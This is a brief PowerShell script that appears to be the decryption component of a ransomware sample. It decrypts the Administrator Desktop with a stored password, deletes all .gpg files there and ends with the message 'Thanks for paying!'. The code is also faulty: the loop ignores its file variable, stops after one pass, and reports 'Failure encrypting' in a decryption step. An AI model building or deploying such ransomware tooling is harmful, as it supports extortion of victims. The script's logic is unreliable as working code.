#Decryption

$FilesToDecrypt = Get-Content -Path encryptedfiles.txt

$SMEM = Get-Content -Path SMEM.txt

ForEach ($file in $FilesToDecrypt)
    {
        try { Remove-Encryption -FolderPath C:\Users\Administrator\Desktop -Password $SMEM }
        catch {"Failure encrypting"}
        break
        }

Get-ChildItem -Path 'C:\Users\Administrator\Desktop\' *.gpg | foreach { Remove-Item -Path $_.FullName }

Write-Host("Your files have been decrypted! Thanks for paying!")